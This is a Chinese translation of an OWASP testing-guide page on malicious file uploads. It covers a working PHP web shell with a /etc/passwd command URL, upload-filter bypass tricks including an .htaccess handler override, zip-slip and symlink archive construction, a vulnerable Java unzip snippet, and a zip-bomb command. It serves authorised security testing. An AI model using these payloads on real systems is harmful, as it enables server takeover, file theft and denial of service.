# 测试上传恶意文件

|ID          |
|------------|
|WSTG-BUSL-09|

## 概述

许多应用程序的业务流程允许用户向其中上传数据。虽然输入验证对于基于文本的输入字段已被广泛理解，但在接受文件时实现起来更加复杂。尽管许多站点基于允许（或禁止）的扩展名列表实施简单的限制，但这不足以防止攻击者上传具有恶意内容的合法文件类型。

与上传恶意文件相关的漏洞是独特的，因为这些“恶意”文件可以很容易地通过在业务逻辑中包含扫描上传过程中文件的机制来拒绝，从而拒绝那些被视为恶意的文件。此外，这与上传意外文件不同，因为虽然文件类型可能被接受，但该文件仍可能对系统构成恶意。

最后，“恶意”对不同系统意味着不同的事物，例如，可能利用 SQL 服务器漏洞的恶意文件在使用 NoSQL 数据存储的环境中可能不被视为“恶意”。

应用程序可能允许上传包含漏洞利用或 shellcode 的恶意文件，而不将其提交给恶意文件扫描。恶意文件可以在应用程序架构的各个点被检测和阻止，例如：入侵检测/防御系统、应用服务器防病毒软件或应用程序在上传文件时进行防病毒扫描（可能使用 SCAP 卸载扫描）。

### 示例

此漏洞的一个常见示例是博客或论坛等应用程序，允许用户上传图像和其他媒体文件。虽然这些被认为是安全的，但如果攻击者能够上传可执行代码（例如 PHP 脚本），则可能允许他们执行操作系统命令、读取和修改文件系统中的信息、访问后端数据库并完全控制服务器。

## 测试目标

- 识别文件上传功能。
- 审查项目文档，识别哪些文件类型被认为是可接受的，哪些类型被认为是危险或恶意的。
    - 如果文档不可用，则根据应用程序的用途考虑什么是适当的。
- 确定上传的文件如何处理。
- 获取或创建一组用于测试的恶意文件。
- 尝试将恶意文件上传到应用程序，并确定是否被接受和处理。

## 如何测试

### 恶意文件类型

应用程序可以做的最简单的检查是确定只能上传受信任的文件类型。

#### Web Shell

如果服务器配置为执行代码，则通过上传称为 Web Shell 的文件（允许您执行任意代码或操作系统命令）可能获得服务器上的命令执行权限。要使此攻击成功，文件需要上传到 Web 根目录内，并且服务器必须配置为执行该代码。

将此类 Shell 上传到面向 Internet 的服务器是危险的，因为它允许任何知道（或猜测）Shell 位置的人在服务器上执行代码。可以使用多种技术来保护 Shell 免受未授权访问，例如：

- 使用随机生成的名称上传 Shell。
- 对 Shell 进行密码保护。
- 对 Shell 实施基于 IP 的限制。

**完成后请记住删除 Shell。**

以下示例显示了一个简单的基于 PHP 的 Shell，它执行通过 GET 参数传递的操作系统命令，并且只能从特定 IP 地址访问：

```php
<?php
    if ($_SERVER['REMOTE_HOST'] === "FIXME") { // 在此处设置您的 IP 地址
        if(isset($_REQUEST['cmd'])){
            $cmd = ($_REQUEST['cmd']);
            echo "<pre>\n";
            system($cmd);
            echo "</pre>";
        }
    }
?>
```

一旦 Shell 被上传（使用随机名称），您可以通过在 `cmd` GET 参数中传递它们来执行操作系统命令：

`https://example.org/7sna8uuorvcx3x4fx.php?cmd=cat+/etc/passwd`

#### 过滤器绕过

第一步是确定过滤器允许或阻止什么，以及它们在哪里实现。如果限制是使用 JavaScript 在客户端执行的，则可以使用拦截代理轻松绕过。

如果过滤是在服务器端执行的，则可以尝试多种技术来绕过它，包括：

- 在 HTTP 请求中将 `Content-Type` 的值更改为 `image/jpeg`。
- 将扩展名更改为较不常见的扩展名，例如 `file.php5`、`file.shtml`、`file.asa`、`file.jsp`、`file.jspx`、`file.aspx`、`file.asp`、`file.phtml`、`file.cshtml`。
- 使用双扩展名，例如 `file.jpg.php` 或 `file.png.php`。要使其正常工作，您必须首先了解 Web 服务器如何处理具有多个扩展名的文件。例如，在某些情况下，Web 服务器可能仅检查 `.jpg` 或 `.png` 是否是文件扩展名的一部分，这可能允许攻击者绕过文件扩展名过滤器。
- 更改上传文件的[文件签名](https://en.wikipedia.org/wiki/List_of_file_signatures)或魔数。
- 更改扩展名的大小写，例如 `file.PhP` 或 `file.AspX`。
- 如果请求包含多个文件名，请将它们更改为不同的值。
- 使用特殊尾随字符，如空格、句点或空字符，例如 `file.asp...`、`file.php;jpg`、`file.asp%00.jpg`、`1.jpg%00.php`。
- 在配置不当的 Nginx 版本中，将文件上传为 `test.jpg/x.php` 可能允许其作为 `x.php` 执行。
- 上传包含以下内容的 `.htaccess` 文件：`AddType application/x-httpd-php .png`。这将导致 Apache 服务器将 `.png` 图像当作 `.php` 资源执行。

**请注意，在某些情况下，您可能需要结合上述不同的过滤器绕过技术，以成功绕过服务器端过滤器。**

### 恶意文件内容

一旦文件类型经过验证，确保文件内容安全也很重要。这要难得多，因为所需步骤将根据允许的文件类型而有所不同。

#### 恶意软件

应用程序通常应使用反恶意软件扫描上传的文件，以确保它们不包含任何恶意内容。最简单的测试方法是使用 [EICAR 测试文件](https://www.eicar.org/download-anti-malware-testfile/)，这是一个安全文件，但所有反恶意软件都会将其标记为恶意。

根据应用程序的类型，可能需要测试其他危险文件类型，例如包含恶意宏的 Office 文档。可以使用 [Metasploit Framework](https://github.com/rapid7/metasploit-framework) 和 [Social Engineer Toolkit (SET)](https://github.com/trustedsec/social-engineer-toolkit) 等工具为各种格式生成恶意文件。

上传此文件时，应被应用程序检测并隔离或删除。根据应用程序处理文件的方式，可能不明显是否已发生此操作。

#### 归档目录遍历

如果应用程序提取归档文件（如 ZIP 文件），则可能通过目录遍历写入非预期位置。这可以通过上传包含遍历文件系统路径（使用诸如 `..\..\..\..\shell.php` 之类的序列）的恶意 ZIP 文件来利用。此技术在 [snyk 公告](https://snyk.io/research/zip-slip-vulnerability)中有进一步讨论。

针对归档目录遍历的测试应包括两部分：

1. 一个恶意的归档文件，在提取时突破目标目录。此恶意归档文件应包含两个文件：一个 `base` 文件，提取到目标目录中；一个 `traversed` 文件，尝试向上遍历目录树以到达根文件夹 - 将文件添加到 `tmp` 目录中。恶意路径将包含多级 `../`（例如 `../../../../../../../../tmp/traversed`），以增加到达根目录的机会。一旦攻击成功，测试人员可以发现在 Web 服务器上通过 ZIP 滑脱攻击创建了 `/tmp/traversed`。
2. 使用自定义代码或库提取压缩文件的逻辑。当提取功能未验证归档中的文件路径时，存在归档目录遍历漏洞。以下示例显示了 Java 中存在漏洞的实现：

```java
Enumeration<ZipEntry> entries =​ ​zip​.g​etEntries();

while(entries​.h​asMoreElements()){
    ZipEntry e ​= ​entries.nextElement();
    File f = new File(destinationDir, e.getName());
    InputStream input = zip​.g​etInputStream(e);
    IOUtils​.c​opy(input, write(f));
}
```

按照以下步骤创建一个 ZIP 文件，一旦上传到 Web 服务器，即可滥用上述存在漏洞的代码：

```bash
# 打开一个新终端并创建树结构
# （根据目标系统，可能需要更多目录级别）
mkdir -p a/b/c
# 创建一个基础文件
echo 'base' > a/b/c/base
# 创建一个遍历文件
echo 'traversed' > traversed
# 您可以在此时使用 `tree` 双重检查树结构
# 导航到 a/b/c 根目录
cd a/b/c
# 压缩文件
zip test.zip base ../../../traversed
# 验证压缩文件内容
unzip -l test.zip
```

#### 归档符号链接攻击

如果应用程序提取归档文件（如 ZIP 或 TAR），验证归档中包含的符号链接如何处理非常重要。与归档目录遍历（ZIP 滑脱）不同，此技术不依赖于 `../` 路径遍历序列。

攻击者可以构建一个包含指向服务器上敏感文件（例如 `/etc/passwd`）的符号链接的归档文件。如果提取过程保留符号链接而不进行验证，并且应用程序随后处理或暴露提取的文件，则可能导致对敏感系统文件的非预期访问。

例如，恶意归档文件可能包含：`link.txt -> /etc/passwd`

如果后端在未验证或拒绝符号链接的情况下提取此归档文件，并且应用程序读取 `link.txt`，它可能无意中泄露 `/etc/passwd` 的内容。

##### 如何测试

1. 创建符号链接：`ln -s /etc/passwd link.txt`
2. 创建归档文件：`tar -czf malicious.tar.gz link.txt`
3. 将归档文件上传到应用程序。
4. 检查：
   - 是否提取了符号链接？
   - 应用程序是否跟随该链接？
   - 是否可以访问敏感文件内容？

##### 影响

- 任意文件读取
- 敏感信息披露

#### ZIP 炸弹

[ZIP 炸弹](https://en.wikipedia.org/wiki/zip_bomb)（更一般地称为解压炸弹）是一种包含大量数据的归档文件。其目的是通过耗尽尝试解压归档文件的目标系统的磁盘空间或内存来造成拒绝服务。请注意，尽管 ZIP 格式是最常用的示例，但其他格式也受到影响，包括 gzip（常用于传输中的数据压缩）。

在最简单的层面上，可以通过压缩一个由单个字符组成的大文件来创建 ZIP 炸弹。以下示例显示如何创建一个 1MB 的文件，解压后将变为 1GB：

```bash
dd if=/dev/zero bs=1M count=1024 | zip -9 > bomb.zip
```

有许多方法可以实现更高的压缩比，包括多级压缩、[滥用 ZIP 格式](https://www.bamsoftware.com/hacks/zipbomb/)和[自产生程序](https://research.swtch.com/zip)（即包含自身副本的归档文件，导致无限递归）。

成功的 ZIP 炸弹攻击将导致拒绝服务，并且如果使用自动扩展云平台，还可能导致成本增加。**除非您已考虑这些风险并获得书面批准，否则请勿进行此类攻击。**

#### XML 文件

XML 文件存在许多潜在漏洞，例如 XML 外部实体（XXE）和拒绝服务攻击，如[十亿笑攻击](https://en.wikipedia.org/wiki/Billion_laughs_attack)。

这些在[测试 XML 注入](../07-Input_Validation_Testing/07-Testing_for_XML_Injection.md)指南中有进一步讨论。

#### 其他文件格式

许多其他文件格式也有需要考虑的特定安全问题，例如：

- 必须检查图像文件的最大像素/帧大小。
- CSV 文件可能允许 [CSV 注入攻击](https://owasp.org/www-community/attacks/CSV_Injection)。
- Office 文件可能包含恶意宏或 PowerShell 代码。
- PDF 可能包含恶意 JavaScript。

应仔细审查允许的文件格式是否存在潜在危险功能，并在测试期间尽可能尝试利用这些功能。

### 源代码审查

当支持文件上传功能时，以下 API/方法通常在源代码中常见。

- Java：`new file`、`import`、`upload`、`getFileName`、`Download`、`getOutputString`
- C/C++：`open`、`fopen`
- PHP：`move_uploaded_file()`、`Readfile`、`file_put_contents()`、`file()`、`parse_ini_file()`、`copy()`、`fopen()`、`include()`、`require()`
